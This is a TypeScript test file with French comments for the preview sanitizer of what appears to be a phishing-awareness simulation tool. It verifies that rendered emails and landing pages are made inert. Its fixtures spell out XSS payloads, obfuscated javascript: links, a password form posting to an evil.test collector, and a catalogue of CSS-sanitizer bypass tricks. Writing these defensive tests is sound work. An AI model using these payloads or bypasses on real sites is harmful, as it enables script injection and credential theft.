import { afterAll, beforeAll, describe, expect, test, vi } from 'vitest';
import { mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

// Comme render.test : base SQLite en mémoire (preview → render → loader → db).
vi.mock('$lib/server/db', async () => {
	const { createTestDb } = await import('../db/test-db');
	return { db: createTestDb() };
});

import type { Scenario } from '$lib/server/db/schema';
import { makeScenarioRoot, writeScenarioPackage } from './fixtures';
import { getScenario, loadScenarios } from './loader';
import {
	PREVIEW_RECEIVED_AT,
	PREVIEW_RECIPIENT,
	PREVIEW_SENTINELS,
	renderScenarioPreview,
	sanitizeCss,
	sanitizePreviewHtml
} from './preview';
import type { ScenarioPreview } from './preview';

/**
 * Le dépôt ne livre plus de scénario : on écrit des paquets FIXTURE neutres et
 * représentatifs sur disque, puis on vérifie que leur aperçu reste inerte.
 */
const KEYS = ['fixture-un', 'fixture-deux'];

/** Attributs qui déclenchent une requête ou une navigation. */
const URL_ATTRS = 'href|xlink:href|src|srcset|action|formaction|poster|background|data|ping';
const EXTERNAL_IN_ATTR = new RegExp(
	`\\s(?:${URL_ATTRS})\\s*=\\s*["']?\\s*(?:https?:|//|javascript:)`,
	'i'
);
const EXTERNAL_IN_CSS = /url\(\s*['"]?\s*(?:https?:|\/\/)/i;
const ON_ATTR = /<[A-Za-z][^<>]*?\son[a-z-]*\s*=/i;
const FIELD_NAME = /<(?:input|select|textarea|button)\b[^>]*\sname\s*=/i;
/** Tout attribut de lien (`href`, `xlink:href`, `*:href`) dans une balise. */
const LINK_ATTR = /<[A-Za-z][^<>]*\s(?:[A-Za-z-]+:)?href\s*=/i;
const CSP_META_PREFIX = '<meta http-equiv="Content-Security-Policy"';

/** Propriétés communes à tout HTML d'aperçu. */
function expectInert(html: string, label: string): void {
	expect(html, label).not.toMatch(/<script/i);
	expect(html, label).not.toMatch(ON_ATTR);
	expect(html, label).not.toMatch(LINK_ATTR);
	expect(html, label).not.toMatch(/<(?:iframe|object|embed|base|link|frame|applet)\b/i);
	expect(html, label).not.toMatch(/http-equiv\s*=\s*["']?refresh/i);
	expect(html, label).not.toMatch(EXTERNAL_IN_ATTR);
	expect(html, label).not.toMatch(EXTERNAL_IN_CSS);
	expect(html, label).not.toMatch(/@import/i);
	expect(html, label).not.toMatch(/fonts\.googleapis|fonts\.gstatic/i);
	expect(html, label).not.toContain('/t/');
	expect(html, label).not.toContain('{{');
	expect(html, label).not.toMatch(/<!--/);
	// Chaque <form> pointe vers la sentinelle de soumission.
	for (const form of html.match(/<form\b[^>]*>/gi) ?? []) {
		expect(form, label).toContain(`action="${PREVIEW_SENTINELS.submit}"`);
	}
	// CSP restrictive injectée, une seule fois.
	expect(html.split(CSP_META_PREFIX), label).toHaveLength(2);
}

describe('aperçu de paquets fixture représentatifs', () => {
	const previews = new Map<string, ScenarioPreview>();
	let root: string;

	beforeAll(async () => {
		root = await makeScenarioRoot();
		for (const key of KEYS) await writeScenarioPackage(root, { key, title: key });
		await loadScenarios(root);
		for (const key of KEYS) {
			const scenario = getScenario(key);
			expect(scenario, key).toBeDefined();
			previews.set(key, await renderScenarioPreview(scenario as Scenario));
		}
	});

	afterAll(async () => {
		await rm(root, { recursive: true, force: true });
	});

	test.each(KEYS)('%s : métadonnées fictives et non vides', (key) => {
		const p = previews.get(key)!;
		expect(p.subject.trim()).not.toBe('');
		expect(p.subject).not.toContain('{{');
		expect(p.fromName.trim()).not.toBe('');
		expect(p.fromAddress).toMatch(/^[^@\s]+@[a-z0-9-]+\.invalid$/);
		expect(p.recipient.email).toMatch(/@[a-z0-9.-]+\.invalid$/);
		expect(p.recipient.firstName).not.toBe('');
		expect(p.recipient.lastName).not.toBe('');
		expect(p.receivedAt).toBe(PREVIEW_RECEIVED_AT);
	});

	test.each(KEYS)('%s : les trois pages sont inertes', (key) => {
		const p = previews.get(key)!;
		expectInert(p.emailHtml, `${key}/email`);
		expectInert(p.landingHtml, `${key}/landing`);
		expectInert(p.awarenessHtml, `${key}/awareness`);
		// Le doctype est conservé (mode standard) et les xmlns restent intacts.
		expect(p.landingHtml.startsWith('<!DOCTYPE html>')).toBe(true);
		expect(p.emailHtml).toContain('xmlns="http://www.w3.org/1999/xhtml"');
	});

	test.each(KEYS)('%s : aucun href ni xlink:href dans les trois pages', (key) => {
		const p = previews.get(key)!;
		for (const html of [p.emailHtml, p.landingHtml, p.awarenessHtml]) {
			expect(html).not.toMatch(/\s(?:[A-Za-z-]+:)?href\s*=/i);
			expect(html).not.toContain(PREVIEW_SENTINELS.click);
		}
	});

	test.each(KEYS)('%s : marqueurs de clic et de soumission présents', (key) => {
		const p = previews.get(key)!;
		expect(p.emailHtml).toMatch(
			/<a style="cursor:pointer;[^"]*" data-rf-preview="click" tabindex="0" role="link">/
		);
		expect(p.emailHtml).toContain(PREVIEW_RECIPIENT.firstName);
		expect(p.emailHtml).not.toContain('data-rf-preview="submit"');
		expect(p.landingHtml).toMatch(/<form\b/i);
		expect(p.landingHtml).toContain(`action="${PREVIEW_SENTINELS.submit}"`);
		expect(p.landingHtml).toMatch(/<button\b[^>]*\sdata-rf-preview="submit"/);
		expect(p.landingHtml).not.toContain('data-rf-preview="click"');
		expect(p.landingHtml).not.toMatch(FIELD_NAME);
		expect(p.awarenessHtml).toContain('note de sensibilisation');
		expect(p.awarenessHtml).not.toContain('data-rf-preview');
	});
});

test('renderScenarioPreview : date de réception et note fournies', async () => {
	const root = await makeScenarioRoot();
	try {
		await writeScenarioPackage(root, { key: 'fixture-note' });
		await loadScenarios(root);
		const scenario = getScenario('fixture-note') as Scenario;
		const p = await renderScenarioPreview(scenario, {
			receivedAt: new Date('2026-01-02T03:04:05.000Z'),
			awarenessMessage: '<b>Note</b> & co'
		});
		expect(p.receivedAt).toBe('2026-01-02T03:04:05.000Z');
		// Échappée par renderAwareness, puis conservée telle quelle par l'assainissement.
		expect(p.awarenessHtml).toContain('&lt;b&gt;Note&lt;/b&gt; &amp; co');
	} finally {
		await rm(root, { recursive: true, force: true });
	}
});

test('MJML : polices Google Fonts, icônes sociales et images externes neutralisées', async () => {
	// Sans `mj-all font-family`, MJML ajoute <link> + @import Google Fonts (Ubuntu).
	const dir = await mkdtemp(join(tmpdir(), 'redfish-preview-'));
	try {
		await writeFile(
			join(dir, 'manifest.yaml'),
			[
				'key: fixture',
				'subject: "Bonjour {{firstName}}"',
				'templates:',
				'  email: email.mjml',
				'  landing: landing.html',
				'  awareness: awareness.html'
			].join('\n')
		);
		await writeFile(
			join(dir, 'email.mjml'),
			`<mjml><mj-head><mj-font name="Raleway" href="https://fonts.googleapis.com/css?family=Raleway" /></mj-head>
			<mj-body>
			<mj-section background-url="https://cdn.example.test/s.png"><mj-column>
			<mj-image src="https://cdn.example.test/x.png" href="https://evil.example.test/" />
			<mj-text font-family="Raleway">Hi {{firstName}} <a href="https://evil.example.test/">x</a></mj-text>
			<mj-button href="{{clickUrl}}">Go</mj-button>
			<mj-social><mj-social-element name="facebook" href="https://fb.example.test/x">fb</mj-social-element></mj-social>
			<mj-raw><img src="{{openUrl}}" width="1" height="1" alt="" /></mj-raw>
			</mj-column></mj-section></mj-body></mjml>`
		);
		await writeFile(
			join(dir, 'landing.html'),
			'<!doctype html><html><head><meta http-equiv="refresh" content="0;url=https://evil.example.test/"></head>' +
				'<body><form action="{{submitUrl}}"><input id="a"><button>OK</button></form>' +
				'<script>navigator.sendBeacon("{{beaconUrl}}")</script></body></html>'
		);
		await writeFile(join(dir, 'awareness.html'), '<p>{{awarenessMessage}}</p>');

		const p = await renderScenarioPreview({ key: 'fixture', path: dir } as Scenario);
		expectInert(p.emailHtml, 'fixture/email');
		expectInert(p.landingHtml, 'fixture/landing');
		expectInert(p.awarenessHtml, 'fixture/awareness');
		expect(p.emailHtml).not.toMatch(/example\.test/);
		// Un seul élément cliquable (le bouton de clic) ; les autres liens sont inertes.
		expect(p.emailHtml.match(/data-rf-preview="click"/g)).toHaveLength(1);
		expect(p.emailHtml).toContain('src="data:image/gif;base64,');
		expect(p.landingHtml).toMatch(/<button data-rf-preview="submit">OK<\/button>/);
		expect(p.subject).toBe('Bonjour Camille');
		expect(p.fromAddress).toBe('ne-pas-repondre@fixture.invalid');
		// Document sans <html>/<head> : la CSP est quand même injectée en tête.
		expect(p.awarenessHtml.startsWith(CSP_META_PREFIX)).toBe(true);
	} finally {
		await rm(dir, { recursive: true, force: true });
	}
});

describe('sanitizePreviewHtml', () => {
	test('retire scripts, gestionnaires on*, cadres et métadonnées dangereuses', () => {
		const html = sanitizePreviewHtml(
			[
				'<!doctype html><html><head><base href="https://evil.test/">',
				'<meta http-equiv="refresh" content="0;url=https://evil.test">',
				'<meta name="viewport" content="width=device-width">',
				'<link rel="stylesheet" href="https://evil.test/a.css">',
				'<link rel="preconnect" href="//evil.test">',
				'<script src="https://evil.test/x.js"></script><SCRIPT>alert(1)</SCRIPT >',
				'</head><body onload="alert(1)">',
				'<img src=x OnError=alert(1) alt="ok">',
				'<iframe src="https://evil.test"></iframe><object data="https://evil.test/o"></object>',
				'<embed src="https://evil.test/e"><frameset><frame src="https://evil.test/f"></frameset>',
				'<svg><a xlink:href="javascript:alert(1)"><text>t</text></a>',
				'<set attributeName="href" to="javascript:alert(1)"/></svg>',
				'</body></html>'
			].join('\n')
		);
		expectInert(html, 'adversarial');
		expect(html).not.toMatch(/evil\.test|alert/);
		expect(html).toContain('<meta name="viewport" content="width=device-width">');
		expect(html).toContain('alt="ok"');
		expect(html.startsWith('<!DOCTYPE html><html><head><meta http-equiv="Content-Security')).toBe(
			true
		);
	});

	test('neutralise les URLs de navigation et de ressource, y compris obfusquées', () => {
		const html = sanitizePreviewHtml(
			[
				'<a href="https://evil.test/">1</a>',
				'<a href=//evil.test>2</a>',
				'<a href="java&#115;cript:alert(1)">3</a>',
				'<a href=" &#x6A;avascript&colon;alert(1)">4</a>',
				'<a href="/t/c/abc">5</a>',
				'<a href="#rf-preview-click" target="_blank" ping="https://evil.test/p">6</a>',
				'<img src="https://evil.test/i.png" srcset="https://evil.test/i2.png 2x">',
				'<img src="data:image/png;base64,iVBORw0KGgo=">',
				'<video poster="https://evil.test/p.png" src="https://evil.test/v.mp4"></video>',
				'<table background="https://evil.test/bg.png"><tr><td>x</td></tr></table>',
				'<svg><use href="https://evil.test/s.svg#a"/><use href="#local"/>',
				'<image xlink:href="https://evil.test/i.svg"/></svg>',
				'<form action="https://evil.test/collect" method="post" target="_top">',
				'<input name="password" type="password"><button formaction="https://evil.test">Go</button>',
				'</form><form><select name="s"></select></form>'
			].join('\n')
		);
		expectInert(html, 'urls');
		expect(html).not.toMatch(/evil\.test|javascript|\/t\//i);
		// Liens neutralisés : plus aucun href, aucun marqueur.
		for (const n of [1, 2, 3, 4, 5]) expect(html).toContain(`<a>${n}</a>`);
		expect(html).toContain(
			'<a data-rf-preview="click" tabindex="0" role="link" style="cursor:pointer">6</a>'
		);
		expect(html).toContain('src="data:image/png;base64,iVBORw0KGgo="');
		expect(html).toContain('<use />');
		expect(html).toContain('<image />');
		expect(html).not.toMatch(FIELD_NAME);
		expect(html.match(/<form action="#rf-preview-submit" method="get">/g)).toHaveLength(2);
		expect(html).toContain('<button data-rf-preview="submit">Go</button>');
	});

	test('aucun lien navigable : a, area, svg a, MathML, xlink:href, préfixes', () => {
		const html = sanitizePreviewHtml(
			[
				'<a href="#rf-preview-click" HREF="https://evil.test" style="color:red">c</a>',
				'<a href = " #rf-preview-&#99;lick ">c2</a>',
				'<map><area href="#rf-preview-click" shape="default"><area href="#x"></map>',
				'<svg><a xlink:href="#rf-preview-click"><text>s</text></a><a href="#y"><text>t</text></a></svg>',
				'<math><mi href="#rf-preview-click">m</mi><mtext xlink:href="#z">n</mtext></math>',
				'<p foo:href="#x" data-rf-preview="click">p</p><a href="#q" DATA-RF-PREVIEW="submit">q</a>'
			].join('\n')
		);
		expectInert(html, 'links');
		expect(html).toContain(
			'<a style="cursor:pointer;color:red" data-rf-preview="click" tabindex="0" role="link">c</a>'
		);
		expect(html).toContain(
			'<a data-rf-preview="click" tabindex="0" role="link" style="cursor:pointer">c2</a>'
		);
		expect(html).toContain(
			'<area shape="default" data-rf-preview="click" tabindex="0" role="link" style="cursor:pointer">'
		);
		expect(html).toContain('<area>');
		expect(html).toContain(
			'<a data-rf-preview="click" tabindex="0" role="link" style="cursor:pointer"><text>s</text></a>'
		);
		expect(html).toContain('<a><text>t</text></a>');
		// Hors a/area : href retiré, jamais de marqueur ; un marqueur d'entrée est retiré.
		expect(html).toContain('<mi>m</mi><mtext>n</mtext>');
		expect(html).toContain('<p>p</p><a>q</a>');
		expect(html.match(/data-rf-preview=/g)).toHaveLength(4);
	});

	test('contrôles d’envoi marqués, boutons neutres et champs non marqués', () => {
		const html = sanitizePreviewHtml(
			[
				'<form><button>a</button><button type="SUBMIT">b</button><button type=" button">c</button>',
				'<button type="button">d</button><button type="reset">e</button>',
				'<input type="submit" value="f"><input type="image" src="data:image/png;base64,AAAA">',
				'<input type="text"><input type=" submit"><input type="&#115;ubmit"></form>'
			].join('')
		);
		expect(html).toContain('<button data-rf-preview="submit">a</button>');
		expect(html).toContain('<button type="SUBMIT" data-rf-preview="submit">b</button>');
		expect(html).toContain('<button type=" button" data-rf-preview="submit">c</button>');
		expect(html).toContain('<button type="button">d</button><button type="reset">e</button>');
		expect(html).toContain('<input type="submit" value="f" data-rf-preview="submit">');
		expect(html).toContain('data:image/png;base64,AAAA" data-rf-preview="submit">');
		expect(html).toContain('<input type="text"><input type=" submit">');
		expect(html).toContain('<input type="&#115;ubmit" data-rf-preview="submit">');
	});

	test('neutralise url(), image-set() et @import dans <style> et style=""', () => {
		const html = sanitizePreviewHtml(
			[
				'<style>',
				"@import url('https://fonts.googleapis.com/css?family=Ubuntu');",
				'@import "//evil.test/b.css" screen;',
				'@\\69mport "https://evil.test/c.css";',
				'@font-face { font-family: X; src: url(https://fonts.gstatic.com/x.woff2) format("woff2"); }',
				'.a { background: #fff URL( "https://evil.test/a.png" ) no-repeat; }',
				'.b { background-image: u\\72l(https://evil.test/b.png); }',
				'.c { background-image: -webkit-image-set("https://evil.test/c.png" 1x); }',
				'.d { fill: url(#grad); background: url(data:image/gif;base64,R0lGODlhAQABAAAAACw=); }',
				".e::before { content: '\\26A0'; }",
				'/* url(https://evil.test/comment.png) */',
				'</style>',
				'<div style="background:url&#40;https://evil.test/x.png&#41;">x</div>',
				'<div style="color:red;background-image:url(\'//evil.test/y.png\')">y</div>',
				'<svg><rect fill="url(https://evil.test/p.svg#g)" /><rect fill="url(#g)" /></svg>'
			].join('\n')
		);
		expectInert(html, 'css');
		expect(html).not.toMatch(/evil\.test|googleapis|gstatic/);
		expect(html).toContain('fill: url(#grad)');
		expect(html).toContain('url(data:image/gif;base64,R0lGODlhAQABAAAAACw=)');
		expect(html).toContain("content: '\\26A0'");
		expect(html).toContain('style="color:red;background-image:none"');
		expect(html).toContain('<rect fill="url(#g)" />');
	});

	test("aucune sortie d'élément brut (</style>, <svg><style>, noscript, commentaires)", () => {
		const html = sanitizePreviewHtml(
			[
				'<style>.x{} </\\73tyle><img src=x onerror=alert(1)></style>',
				'<svg><style><img src=x onerror=alert(2)></style></svg>',
				'<!-- <img src=x onerror=alert(3)> -->',
				'<!--[if mso]><v:fill src="https://evil.test/v.png" /><![endif]-->',
				'<title><img src=x onerror=alert(4)></title>',
				'<textarea name="t"></textarea><script>alert(5)</script>',
				'<noscript><p title="</noscript><img src=x onerror=alert(6)>"></p></noscript>',
				'<p>a < b > c</p>'
			].join('\n')
		);
		// Ce qui subsiste de ces charges n'est plus que du texte inerte.
		expect(html).not.toMatch(/<img|<script|<noscript|<!--|evil\.test|alert\(5\)/i);
		expect(html).not.toMatch(/\sname=/);
		expect(html.match(/<\/style/gi)).toHaveLength(2);
		expect(html).toContain('<p>a &lt; b &gt; c</p>');
	});

	test("n'ajoute jamais d'attribut name et conserve les attributs anodins", () => {
		const html = sanitizePreviewHtml(
			'<form><label for="u">U</label><input id="u" type="email" placeholder="a@b" autocomplete="off"></form>'
		);
		expect(html).not.toMatch(/\sname=/);
		expect(html).toContain('<input id="u" type="email" placeholder="a@b" autocomplete="off">');
	});
});

test('sanitizeCss laisse intact un CSS sans URL', () => {
	const css = ':root { color-scheme: light; } .a { font: 600 15px/1 "Segoe UI", Arial; }';
	expect(sanitizeCss(css)).toBe(css);
});

describe('sanitizeCss : contournements connus', () => {
	/** Aucune trace de l'URL de test, ni chargement résiduel. */
	const expectNoLoad = (out: string, label: string) => {
		expect(out, label).not.toMatch(/e\/x\.png/);
		expect(out, label).not.toMatch(/url\(\s*['"]?\s*https?:/i);
	};

	const BYPASSES: Record<string, string> = {
		// (a) tiret échappé dans le nom de fonction
		'image\\-set': 'div{background-image:image\\-set("https://e/x.png" 1x)}',
		'\\-webkit-image-set': 'div{background-image:\\-webkit-image-set("https://e/x.png" 1x)}',
		'\\2d webkit-image-set': 'div{background-image:\\2d webkit-image-set("https://e/x.png" 1x)}',
		'cross\\-fade': 'div{background:cross\\-fade(url(#a), "https://e/x.png", 50%)}',
		'-moz-element': 'div{background:-moz-element(#a), image("https://e/x.png")}',
		// (b) échappement hexadécimal suivi d'un saut de ligne dans une chaîne (LF, CR, CRLF, FF)
		'hex + LF': "div{content:'\\41\n';background:url(https://e/x.png)}",
		'hex + CR': "div{content:'\\41\r';background:url(https://e/x.png)}",
		'hex + CRLF': "div{content:'\\41\r\n';background:url(https://e/x.png)}",
		'hex + FF': "div{content:'\\41\f';background:url(https://e/x.png)}",
		// (c) barre oblique inverse + saut de ligne dans une chaîne
		'\\ + CRLF': "div{content:'a\\\r\n';background:url(https://e/x.png)}",
		'\\ + CR': "div{content:'a\\\r';background:url(https://e/x.png)}",
		'\\ + FF': "div{content:'a\\\f';background:url(https://e/x.png)}",
		// (d) accolades dans une chaîne/un commentaire d'un bloc d'at-rule
		'@import {"}': '@import {"}div{background:u\\72l(https://e/x.png)}',
		"@import {'}": "@import {'}div{background:u\\72l(https://e/x.png)}",
		'@import {/*}*/': '@import {/*}*/}div{background:u\\72l(https://e/x.png)}',
		// Soudure de jetons après suppression d'un @import
		'u@import;rl(': 'div{background:u@import x;rl(https://e/x.png)}',
		// Divers
		'url escapé': 'div{background:\\75\\72\\6c(https://e/x.png)}',
		'URL( "…" )': 'div{background:URL( "https://e/x.png" )}',
		'src()': 'div{background:src("https://e/x.png")}',
		// NUL → U+FFFD : `u\u0000rl(` n'est pas `url(` (et ne masque pas le reste).
		NUL: 'div{background:u\u0000rl(#a);background:url(https://e/x.png)}'
	};

	test.each(Object.entries(BYPASSES))('%s', (label, css) => {
		expectNoLoad(sanitizeCss(css), `${label} (feuille)`);
		// Par le HTML : élément <style> et attribut style="" (CR bruts compris).
		const html = sanitizePreviewHtml(
			`<style>${css}</style><div style="${css.replace(/"/g, '&quot;')}">x</div>`
		);
		expectNoLoad(html, `${label} (HTML)`);
		expectInert(html, label);
	});

	test('les fonctions de chargement deviennent `none` sans déborder', () => {
		expect(sanitizeCss('a{background:#fff image\\-set("https://e/x.png" 1x) no-repeat}')).toBe(
			'a{background:#fff none no-repeat}'
		);
		expect(sanitizeCss("a{content:'\\41\n';color:red}")).toBe("a{content:'\\41\n';color:red}");
		expect(sanitizeCss("a{content:'\\41\r\n';color:red}")).toBe("a{content:'\\41\n';color:red}");
		expect(sanitizeCss('a{x:1}@import url(https://e/x.css);b{y:2}')).toBe('a{x:1}b{y:2}');
		expect(sanitizeCss('a{fill:url(#g);mask:url("#m")}')).toBe('a{fill:url(#g);mask:url("#m")}');
		// Cible admise écrite avec échappements : ré-émise sous forme canonique.
		expect(sanitizeCss('a{fill:u\\72l(\\23 g)}')).toBe('a{fill:url(#g)}');
	});

	test('échec fermé : une déclaration qui contient encore un chargement est supprimée', () => {
		// Texte d'une chaîne : inerte pour le navigateur, mais supprimé (fermé).
		expect(sanitizeCss('a{color:red;content:"url(https://e/x.png)";top:0}')).toBe(
			'a{color:red;;top:0}'
		);
		expect(sanitizeCss('a{content:"\\@import x";color:red}')).toBe('a{;color:red}');
		expect(sanitizeCss('a::before{content:"image (1)"}')).toBe('a::before{}');
		expect(sanitizeCss('a{color:red;x:ur/**/l(https://e/x.png)}')).toBe('a{color:red;}');
		expect(sanitizeCss('a{color:red;background:url\n(https://e/x.png)}')).toBe('a{color:red;}');
		// Sans fonction de chargement, une chaîne reste intacte.
		expect(sanitizeCss('a::before{content:"url: https://e/x.png"}')).toBe(
			'a::before{content:"url: https://e/x.png"}'
		);
	});
});

describe('meta CSP : premier élément du head effectif', () => {
	const csp = (html: string) => sanitizePreviewHtml(html);

	test('head explicite précédé seulement de blancs, doctype et <html>', () => {
		expect(csp('<!doctype html>\n<html lang="fr">\n<head><title>t</title></head>')).toMatch(
			/^<!DOCTYPE html>\n<html lang="fr">\n<head><meta http-equiv="Content-Security-Policy"[^>]*><title>/
		);
		expect(csp('<head><meta charset="utf-8"></head>')).toMatch(
			/^<head><meta http-equiv="Content-Security-Policy"[^>]*><meta charset="utf-8">/
		);
	});

	test('contenu avant <head> : insertion au tout début du document', () => {
		expect(csp('foo<head><title>t</title></head><p>x</p>').startsWith(CSP_META_PREFIX)).toBe(true);
		expect(csp('<p>x</p><head>').startsWith(CSP_META_PREFIX)).toBe(true);
		expect(csp('</head><head>').startsWith(CSP_META_PREFIX)).toBe(true);
		expect(csp('<svg></svg><head>').startsWith(CSP_META_PREFIX)).toBe(true);
		// Après le doctype (mode standard conservé).
		expect(csp('<!doctype html>foo<html><head></head>')).toMatch(
			/^<!DOCTYPE html><meta http-equiv="Content-Security-Policy"[^>]*>foo<html><head><\/head>$/
		);
		// Juste après un <html> propre : le head implicite commence là.
		expect(csp('<!doctype html><html lang="fr"><title>t</title><head>')).toMatch(
			/^<!DOCTYPE html><html lang="fr"><meta http-equiv="Content-Security-Policy"[^>]*><title>/
		);
	});

	test('éléments retirés avant <head> : sans effet sur le placement', () => {
		expect(
			csp('<!doctype html><link rel="stylesheet" href="https://e/x.css"><!-- c --><head>')
		).toMatch(/^<!DOCTYPE html><head><meta http-equiv="Content-Security-Policy"/);
	});

	test('une seule meta CSP, quel que soit le document', () => {
		for (const html of ['', 'x', '<head><head>', '<html><html><head>', '<head></head><head>']) {
			expect(csp(html).split(CSP_META_PREFIX), html).toHaveLength(2);
		}
	});
});

test('attributionsrc et data-rf-preview d’entrée retirés', () => {
	const html = sanitizePreviewHtml(
		'<img src="data:image/png;base64,AAAA" attributionsrc="https://e/x"><div data-rf-preview="click">d</div>'
	);
	expect(html).not.toMatch(/attributionsrc|data-rf-preview|https:/);
});

test('attributs texte : un faux appel (« URL (… ») reste intact, un vrai est neutralisé', () => {
	const html = sanitizePreviewHtml(
		'<input placeholder="Collez l\'URL (https://exemple.invalid)"><svg><rect fill="u&#x72;l(https://e/x.png)" /></svg>'
	);
	expect(html).toContain('placeholder="Collez l\'URL (https://exemple.invalid)"');
	expect(html).toContain('<rect fill="none" />');
});
